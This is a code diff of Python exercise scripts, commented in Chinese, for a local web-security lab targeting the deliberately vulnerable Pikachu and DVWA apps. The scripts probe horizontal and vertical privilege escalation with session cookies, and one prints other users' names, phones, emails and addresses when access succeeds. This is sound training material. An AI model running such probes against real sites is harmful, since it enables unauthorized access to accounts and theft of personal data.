@@ -31,28 +31,27 @@ for username in usernames:
     resp = requests.get(url, headers=headers, params=params)
     print(f"\n测试用户: {username} | 状态码: {resp.status_code}")
     
-    if username != current_user and "欢迎来到个人信息中心" in resp.text:
+    if username != current_user and "个人信息中心" in resp.text:
         print(f"水平越权漏洞存在！可访问 {username} 的资料")
         print("--- 资料片段 ---")
         for line in resp.text.split('\n'):
             if any(k in line for k in ["姓名", "手机", "邮箱", "住址"]):
                 print(line.strip())
-        print("----------------")
+        print("-"*30)
     else:
         print(f"无法访问 {username} 的资料（权限正常）")
 
 ### 习题3：垂直越权探测（普通用户访管理员页面
 import requests
 admin_urls=[
-    "http://127.0.0.1:9999/dvwa/admin/",
     "http://127.0.0.1:9999/pikachu/vul/overpermission/op2/op2_admin.php"
 ]
 headers={
-    "cookie":"PHPSESSID=qroboe16vr1lpiifibh1gnc3m3;security=low"
+    "cookie":"PHPSESSID=km9oveafhn7qa2cn79g1tiv4r3;security=low"
 }
 for url in admin_urls:
     resp=requests.get(url,headers=headers)
-    if resp.status_code == 200 and "manage" in resp.text:
+    if resp.status_code == 200 and "删除" in resp.text:
         print(f"垂直越权成功:{url}")
     else:
         print(f"无法访问:{url}")
